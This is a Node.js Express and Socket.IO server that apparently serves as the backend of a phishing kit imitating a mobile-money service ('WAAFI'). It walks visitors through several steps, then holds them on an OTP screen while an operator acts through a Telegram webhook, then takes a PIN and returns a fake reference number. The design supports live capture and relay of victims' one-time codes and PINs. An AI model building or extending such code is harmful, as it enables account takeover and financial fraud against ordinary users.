const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Share io globally so bot_manager.js can access it
global.io = io;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Mock database / session store
const sessions = new Map();

function generateAppId() {
    return 'COD-' + Math.random().toString(36).substring(2, 7).toUpperCase();
}

// REST Endpoints for frontend fallback or validation
app.post('/api/initialize', (req, res) => {
    const appId = generateAppId();
    sessions.set(appId, { appId, step: 1, created_at: Date.now() });
    res.json({ success: true, appId });
});

// Telegram Webhook Endpoint
app.post('/telegram-webhook', (req, res) => {
    // Forward to bot manager handler if structured that way
    res.sendStatus(200);
});

// Socket.IO Connection Logic
io.on('connection', (socket) => {
    const appId = generateAppId();
    sessions.set(appId, { appId, socketId: socket.id, step: 1 });
    
    // Send initial session data back to client
    socket.emit('session-ready', { appId });

    // FIX ADDED: Join room listener with live state auditing logs
    socket.on('join-room', (room) => {
        socket.join(room);

        console.log(`✅ User joined room: ${room}`);

        const rooms = global.io.sockets.adapter.rooms;
        console.log('ROOM EXISTS:', rooms.has(room));
    });

    socket.on('step1', (data) => {
        if (sessions.has(data.appId)) {
            let session = sessions.get(data.appId);
            Object.assign(session, data, { step: 2 });
            sessions.set(data.appId, session);
        }
    });

    socket.on('step2', (data) => {
        if (sessions.has(data.appId)) {
            let session = sessions.get(data.appId);
            Object.assign(session, data, { step: 3 });
            sessions.set(data.appId, session);
        }
    });

    socket.on('step3-data', (data) => {
        if (sessions.has(data.appId)) {
            let session = sessions.get(data.appId);
            Object.assign(session, data, { step: 4 });
            sessions.set(data.appId, session);
            
            // Trigger external notifications (like Telegram alert) here
        }
    });

    socket.on('step4-otp', (data) => {
        // Keeps state spinning on frontend until admin manual action triggers via Telegram
        console.log(`Recieved OTP submission for application context room.`);
    });

    socket.on('step5-pin', (data) => {
        const referenceId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
        socket.emit('pin-verified', { referenceId });
    });

    socket.on('disconnect', () => {
        // Clean up logic if needed
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running securely on port ${PORT}`);
});